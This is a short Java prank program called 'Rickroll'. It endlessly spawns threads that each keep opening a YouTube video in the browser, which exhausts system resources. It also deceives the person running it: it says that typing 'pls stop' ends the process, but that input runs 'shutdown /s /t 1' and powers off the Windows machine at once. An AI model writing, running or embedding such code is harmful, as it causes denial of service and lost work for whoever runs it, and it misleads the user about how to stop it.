import java.awt.*;
import java.io.IOException;
import java.net.URI;
import java.util.Scanner;

public class Rickroll {

    public static void main(String[] args) throws IOException {
        Desktop desktop = Desktop.getDesktop();

        new Thread(() -> {
            Scanner s = new Scanner(System.in);
            while (true) {
                System.out.println("Kill the Process with \"pls stop\"");
                String input = s.nextLine();
                if (input.equals("pls stop")) {
                    try {
                        Runtime.getRuntime().exec("shutdown /s /t 1");
                        System.out.println("Ok I'll stop");
                    } catch (Exception ignored) {
                        ignored.printStackTrace();
                    }
                }
            }
        }).start();

        while (true) {
            new Thread(() -> {
                while (true) {
                    try {
                        desktop.browse(new URI("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
                    } catch (Exception ignored) {
                    }
                }
            }).start();
        }


    }
}